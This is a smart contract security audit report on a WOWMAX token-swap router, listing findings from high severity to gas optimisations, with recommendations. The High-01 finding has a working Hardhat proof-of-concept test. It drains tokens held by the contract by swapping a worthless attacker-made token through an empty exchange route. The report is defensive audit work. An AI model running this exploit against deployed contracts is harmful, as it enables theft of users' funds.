# Conducted by:

_0xAkira_

---

# [High-01] Tokens lying in the contract can be exchanged for malicious tokens

### Description

An attacker can create their own malicious token, to mine any number of tokens for themselves. In the contract, the
attacker calls `swap()`.

```solidity
function swap(
  ExchangeRequest calldata request
) external payable virtual override reentrancyProtectedSwap returns (uint256[] memory amountsOut) {
  amountsOut = _swap(request, true);
}

```

In this function, the attacker fills in a structure  
`ExchangeRequest`

```solidity
/**
 * @notice Exchange request details structure
 * @param from Source token address
 * @param amountIn Source token amount to swap
 * @param to Array of target token addresses
 * @param exchangeRoutes Array of exchange routes
 * @param slippage Array of slippage tolerance values for each target token
 * @param amountOutExpected Array fo expected output amounts for each target token
 */
struct ExchangeRequest {
  address from;
  uint256 amountIn;
  address[] to;
  ExchangeRoute[] exchangeRoutes;
  uint256[] slippage;
  uint256[] amountOutExpected;
}

```

1. In `address from`, the attacker specifies his malicious token.
2. `uint256 amountIn` specifies how many of his tokens he will give away.
3. `address[] to` specifies the array of tokens that are in this contract and what he wants to exchange his tokens for.
4. `ExchangeRoute[] exchangeRoutes`. Here the attacker passes an **empty array**, so that the exchange would take place
   without the available Dex, but only with the contract.
5. `uint256[] amountOutExpected:` passes an array with the number of expected tokens.

### Working Test Case

```ts
it.only("Should be an exchange for tokens in the contract ", async () => {
  MALW = await new MockERC20__factory(attacker).deploy("Malware token", "MALW", 18, ethers.utils.parseEther("1000000"));

  const busdAmount = ethers.utils.parseEther("1000");

  await BUSD.transfer(wowmaxNew.address, busdAmount);

  const request = {
    from: MALW.address,
    amountIn: busdAmount,
    to: [BUSD.address],
    exchangeRoutes: [],
    slippage: [0],
    amountOutExpected: [busdAmount],
  };
  await MALW.connect(attacker).approve(wowmaxNew.address, busdAmount);
  await wowmaxNew.connect(attacker).swap(request, { gasLimit: 3e7 });

  await expect(await BUSD.balanceOf(attacker.address)).to.eq(busdAmount);
});
```

```bash
WOWMAX Router Specification
    Swap
      ✔ Should be an exchange for tokens in the contract  (314ms)


  1 passing (4s)
```

### Recommendation:

If it is not planned to be possible to exchange tokens for tokens in the contract, a check on the length should be added
`exchangeRoutes`

```solidity
require(exchangeRoutes.length != 0);
```

# [Med-01] Missing modifier

### Description:

`swapCallback()` functions use the modifier `onlyDuringSwap`, but the `d3MMSwapCallBack()` function does not have this
modifier. This can be exploited by an attacker

```solidity
function d3MMSwapCallBack(address token, uint256 value, bytes calldata data) external {
  DODOV3.invokeCallback(token, value, data);
}

```

### Recommendation:

Add a modifier to this function

# [Med-02] Function selector check is missing

### Description:

The `fallback` function accepts `msg.data` and calls the function  
`decodeCallback` in the `UniswapV3 library`. An attacker can use the **function selector collision** and call another
method.

```solidity
fallback() external onlyDuringSwap {
  (bool success, int256 amount0Delta, int256 amount1Delta, bytes calldata data) = UniswapV3.decodeCallback({
    dataWithSelector: msg.data
  });
  require(success, "WOWMAX: unsupported callback");

  UniswapV3.invokeCallback(amount0Delta, amount1Delta, data);
}

```

```solidity
function decodeCallback(
        bytes calldata dataWithSelector
    ) internal pure returns (bool, int256, int256, bytes calldata) {
        int256 amount0Delta;
        int256 amount1Delta;
        bytes calldata data;
        assembly {
            amount0Delta := calldataload(add(dataWithSelector.offset, 4))
            amount1Delta := calldataload(add(dataWithSelector.offset, 36))

```

### Recommendation:

It is worth considering adding a check on the function selector

```solidity
bytes4 constant uniswapV3SwapCallbackMethodSelector = 0xfa461e33;
bytes4 selector = bytes4(msg.data[:4]);
require(selector == uniswapV3SwapCallbackMethodSelector, "invalid callback method name");
```

```js
Welcome to Chisel! Type `!help` to show available commands.
➜ interface UniswapV3CallbackListener {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata _data
    ) external;
}
➜ UniswapV3CallbackListener.uniswapV3SwapCallback.selector
Type: bytes4
└ Data: 0xfa461e3300000000000000000000000000000000000000000000000000000000
➜ bytes4 v3callbackSelector = 0xfa461e3300000000000000000000000000000000000000000000000000000000;
```

# [Low-01] No check for maximum, minimum allowable value

### Description

There are variables in the contract `maxFeePercentage` and `maxSlippage`, which have default values of **1%** and
**20%**, respectively.

```solidity
    /**
     * @dev Max fee percentage. All contract percentage values have two extra digits for precision. Default value is 1%
     */
    uint256 public maxFeePercentage = 100;

    /**
     * @dev Max allowed slippage percentage, default value is 20%
     */
    uint256 public maxSlippage = 2000;
```

There are also functions for changing these values `setMaxFeePercentage()`, `setMaxSlippage()`

```solidity
function setMaxFeePercentage(uint256 _maxFeePercentage) external onlyOwner {
  maxFeePercentage = _maxFeePercentage;
}

function setMaxSlippage(uint256 _maxSlippage) external onlyOwner {
  maxSlippage = _maxSlippage;
}

```

These functions have no checks on input data.

### Recommendation:

We should consider the possibility of adding a `require` that will check for the **maximum** and **minimum** allowable
values.

# [Low-02]

### Description

When `maxFeePercentage` and `maxSlippage` are changed with `setMaxFeePercentage()` and `setMaxSlippage()` no event is
triggered. It would be important to call this event for any external integration with this system.

### Recommended Mitigation Steps

events definition

```solidity
event MaxFeeUpdate(uint256 newMaxFee);
event MaxSlippageUpdate(uint256 newMaxSlippage);
```

events emit at `setMaxFeePercentage` and `setMaxSlippage` function.

```solidity
function setMaxFeePercentage(uint256 _maxFeePercentage) external onlyOwner {
  maxFeePercentage = _maxFeePercentage;
  emit MaxFeeUpdate(_maxFeePercentage);
}

function setMaxSlippage(uint256 _maxSlippage) external onlyOwner {
  maxSlippage = _maxSlippage;
  emit MaxSlippageUpdate(_maxSlippage);
}

```

# [Low-03] Missing NatSpec parameter

### Description:

Many functions in the contract are missing the `@return` parameter in their Natural Specification comments. Consider
including it for completeness.

```solidity
/**
 * @dev receives tokens from the caller
 * @param request Exchange request that contains the token to be received parameters.
 */
function receiveTokens(ExchangeRequest calldata request, bool transferFrom) private returns (uint256) {}

```

```solidity
/**
 * @dev sends swapped received tokens to the caller and treasury
 * @param request Exchange request that contains output tokens parameters
 */
function sendTokens(ExchangeRequest calldata request) private returns (uint256[] memory amountsOut) {}

```

```solidity
/**
 * @dev executes an exchange operation according to the provided route
 * @param exchangeRoute Route to be executed
 */
function exchange(ExchangeRoute calldata exchangeRoute) private returns (uint256) {}

```

```solidity
/**
 * @dev executes a swap operation according to the provided parameters
 * @param from Token to be swapped
 * @param amountIn Amount to be swapped
 * @param swapData Swap data that contains the swap parameters
 */
function executeSwap(address from, uint256 amountIn, Swap calldata swapData) private returns (uint256) {}

```

# [NC-01] Typo on NatSpec comments

### Description:

There are typographical errors in NatSpec comments

1. `contracts::interfaces::IWowmaxRouter.sol`

```solidity
/**
 * @notice Exchange request details structure
 * @param from Source token address
 * @param amountIn Source token amount to swap
 * @param to Array of target token addresses
 * @param exchangeRoutes Array of exchange routes
 * @param slippage Array of slippage tolerance values for each target token
 * @param amountOutExpected Array fo expected output amounts for each target token
 */

struct ExchangeRequest {
  ;
}

```

@param amountOutExpected Array **fo** expected output amounts for each target token

2. `contracts::libraries::UniswapV3.sol`

```solidity
/**
 * @title Uniswap v2 pair interface
 */

interface IUniswapV3Pool {

}

```

@title Uniswap **v2** pair interface

3. `contracts::WowmaxRouterNew.sol`

```solidity
/**
 * @notice Called to msg.sender in iZiSwapPool#swapX2Y(DesireY) call
 * @param x Amount of tokenX trader will pay
 * @param data Any dadta passed though by the msg.sender via the iZiSwapPool#swapX2Y(DesireY) call
 */
function swapX2YCallback() {}

```

@param data Any **dadta** passed though by the msg.sender via the iZiSwapPool#swapX2Y(DesireY) call

4. `contracts::WowmaxRouterNew.sol`

```solidity
/**
 * @notice Called to msg.sender in iZiSwapPool#swapY2X(DesireX) call
 * @param y Amount of tokenY trader will pay
 * @param data Any dadta passed though by the msg.sender via the iZiSwapPool#swapY2X(DesireX) call
 */
function swapY2XCallback() {}

```

@param data Any **dadta** passed though by the msg.sender via the iZiSwapPool#swapY2X(DesireX) call

# [NC-02] No function setTreasury()

### Description

There is a treasury address in the contract where the swap fee is sent. The contract does not provide for changing the
treasury address. If this address is compromised, the entire fee will be sent to the address unavailable to the
contract.

### Recommendation:

It would be worth adding a treasury change function that would only be available to the **admin**

```solidity
function setTreasury(address newTreasury) external onlyOwner {}

```

# [NC-03] No emergency stop mechanism

### Description:

The contract doesn't сontract module which allows children to implement an emergency stop mechanism that can be
triggered by an authorized account.

### Recommendation:

You should consider adding the `Pausable.sol` contract from **Openzeppelin**

# [Gas-01] Cache array length during for loop definition.

### Description:

In the `WowmaxRouterNew.sol` contract in the functions

1. `_swap()`

```solidity
function _swap(ExchangeRequest calldata request, bool transferFrom) internal returns (uint256[] memory amountsOut) {
  checkRequest(request);
  uint256 amountIn = receiveTokens(request, transferFrom);
  for (uint256 i = 0; i < request.exchangeRoutes.length; i++) {
    exchange(request.exchangeRoutes[i]);
  }
  amountsOut = sendTokens(request);

  emit SwapExecuted(
    msg.sender,
    request.from == address(0) ? address(WETH) : request.from,
    amountIn,
    request.to,
    amountsOut
  );
}

```

---

2. `sendTokens()`

```solidity
function sendTokens(ExchangeRequest calldata request) private returns (uint256[] memory amountsOut) {
  amountsOut = new uint256[](request.to.length);
  uint256 amountOut;
  IERC20 token;
  for (uint256 i = 0; i < request.to.length; i++) {
    token = IERC20(request.to[i]);

    amountOut = address(token) == address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)
      ? WETH.balanceOf(address(this))
      : token.balanceOf(address(this));

    uint256 feeAmount;

    if (amountOut > request.amountOutExpected[i]) {
      feeAmount = amountOut - request.amountOutExpected[i];
      uint256 maxFeeAmount = (amountOut * maxFeePercentage) / 10000;
      if (feeAmount > maxFeeAmount) {
        feeAmount = maxFeeAmount;
        amountsOut[i] = amountOut - feeAmount;
      } else {
        amountsOut[i] = request.amountOutExpected[i];
      }
    } else {
      require(
        amountOut >= (request.amountOutExpected[i] * (10000 - request.slippage[i])) / 10000,
        "WOWMAX: Insufficient output amount"
      );
      amountsOut[i] = amountOut;
    }

    if (address(token) == address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)) {
      WETH.withdraw(amountOut);
    }

    transfer(token, treasury, feeAmount);
    transfer(token, msg.sender, amountsOut[i]);
  }
}

```

---

3. `exchange()`

```solidity
function exchange(ExchangeRoute calldata exchangeRoute) private returns (uint256) {
  uint256 amountIn = IERC20(exchangeRoute.from).balanceOf(address(this));
  uint256 amountOut;
  for (uint256 i = 0; i < exchangeRoute.swaps.length; i++) {
    amountOut += executeSwap(
      exchangeRoute.from,
      (amountIn * exchangeRoute.swaps[i].part) / exchangeRoute.parts,
      exchangeRoute.swaps[i]
    );
  }
  return amountOut;
}

```

---

4. `checkRequest()`

```solidity
function checkRequest(ExchangeRequest calldata request) private view {
  require(request.to.length > 0, "WOWMAX: No output tokens specified");
  require(request.to.length == request.amountOutExpected.length, "WOWMAX: Wrong amountOutExpected length");
  require(request.to.length == request.slippage.length, "WOWMAX: Wrong slippage length");
  for (uint256 i = 0; i < request.to.length; i++) {
    require(request.to[i] != address(0), "WOWMAX: Wrong output token address");
    require(request.amountOutExpected[i] > 0, "WOWMAX: Wrong amountOutExpected value");
    require(request.slippage[i] <= maxSlippage, "WOWMAX: Slippage is too high");
  }
}

```

### Recommendation:

The for loop is used. A typical for loop definition may look like: `for (uint256 i; i < arr.length; i++){}`. Instead of
using `array.length`,cache the array length before the loop, and use the cached value to safe gas. This will avoid an
`MLOAD` every loop for arrays stored in memory and an `SLOAD` for arrays stored in storage. This can have significant
gas savings for arrays with a large length, especially if the array is stored in storage.

### Working Test Case

1. `_swap()`

```solidity
function _swap(ExchangeRequest calldata request, bool transferFrom) internal returns (uint256[] memory amountsOut) {
  uint256 start = gasleft();
  checkRequest(request);
  uint256 amountIn = receiveTokens(request, transferFrom);
  for (uint256 i = 0; i < request.exchangeRoutes.length; i++) {
    exchange(request.exchangeRoutes[i]);
  }
  amountsOut = sendTokens(request);

  emit SwapExecuted(
    msg.sender,
    request.from == address(0) ? address(WETH) : request.from,
    amountIn,
    request.to,
    amountsOut
  );
  uint256 end = gasleft();
  uint256 GasUsed = start - end;
  console.log(GasUsed);
  // Uncached -> GasUsed == 224594;
  // With cache -> GasUsed == 223905;
}

```

---

2. `sendTokens()`

```solidity
function sendTokens(ExchangeRequest calldata request) private returns (uint256[] memory amountsOut) {
  uint256 start = gasleft();
  amountsOut = new uint256[](request.to.length);
  uint256 amountOut;
  IERC20 token;
  for (uint256 i = 0; i < request.to.length; i++) {
    token = IERC20(request.to[i]);

    amountOut = address(token) == address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)
      ? WETH.balanceOf(address(this))
      : token.balanceOf(address(this));

    uint256 feeAmount;

    if (amountOut > request.amountOutExpected[i]) {
      feeAmount = amountOut - request.amountOutExpected[i];
      uint256 maxFeeAmount = (amountOut * maxFeePercentage) / 10000;
      if (feeAmount > maxFeeAmount) {
        feeAmount = maxFeeAmount;
        amountsOut[i] = amountOut - feeAmount;
      } else {
        amountsOut[i] = request.amountOutExpected[i];
      }
    } else {
      require(
        amountOut >= (request.amountOutExpected[i] * (10000 - request.slippage[i])) / 10000,
        "WOWMAX: Insufficient output amount"
      );
      amountsOut[i] = amountOut;
    }

    if (address(token) == address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)) {
      WETH.withdraw(amountOut);
    }

    transfer(token, treasury, feeAmount);
    transfer(token, msg.sender, amountsOut[i]);
  }
  uint256 end = gasleft();
  uint256 GasUsed = start - end;
  console.log(GasUsed);
  // Uncached -> GasUsed == 180739;
  // With cache -> GasUsed == 180168;
}

```

---

3. `exchange()`

```solidity
function exchange(ExchangeRoute calldata exchangeRoute) private returns (uint256) {
  uint256 start = gasleft();
  uint256 amountIn = IERC20(exchangeRoute.from).balanceOf(address(this));
  uint256 amountOut;
  uint256 len = exchangeRoute.swaps.length;
  for (uint256 i = 0; i < len i++) {
    amountOut += executeSwap(
      exchangeRoute.from,
      (amountIn * exchangeRoute.swaps[i].part) / exchangeRoute.parts,
      exchangeRoute.swaps[i]
    );
  }
  uint256 end = gasleft();
  uint256 GasUsed = start - end;
  console.log(GasUsed);
  return amountOut;
  // Uncached -> GasUsed == 90221;
  // With cache -> GasUsed == 89612;
}

```

---

4. `checkRequest()`

```solidity
function checkRequest(ExchangeRequest calldata request) private view {
  uint256 start = gasleft();
  require(request.to.length > 0, "WOWMAX: No output tokens specified");
  require(request.to.length == request.amountOutExpected.length, "WOWMAX: Wrong amountOutExpected length");
  require(request.to.length == request.slippage.length, "WOWMAX: Wrong slippage length");
  for (uint256 i = 0; i < request.to.length; i++) {
    require(request.to[i] != address(0), "WOWMAX: Wrong output token address");
    require(request.amountOutExpected[i] > 0, "WOWMAX: Wrong amountOutExpected value");
    require(request.slippage[i] <= maxSlippage, "WOWMAX: Slippage is too high");
  }
  uint256 end = gasleft();
  uint256 GasUsed = start - end;
  console.log(GasUsed);
  // Uncached -> GasUsed == 7379;
  // With cache -> GasUsed == 6808;
}

```

# [Gas-02] Use Custom Errors instead of Revert Strings to save Gas

### Description

Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the
revert condition is met)

Source: https://blog.soliditylang.org/2021/04/21/custom-errors/:

> Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed
> through the use of custom errors. Until now, you could already use strings to give more information about failures
> (e.g., `revert("Insufficient funds.");`), but they are rather expensive, especially when it comes to deploy cost, and
> it is difficult to use dynamic information in them.

Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including
interfaces and libraries).

# [Gas-03] State variables only set in the constructor should be declared immutable

### Description

Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the
expensive storage-writing operation in the constructor (around **20 000** gas per variable) and replace the expensive
storage-reading operations (around **2100** gas per reading) to a less expensive value reading (**3** gas)

```solidity
IWETH public WETH;
```
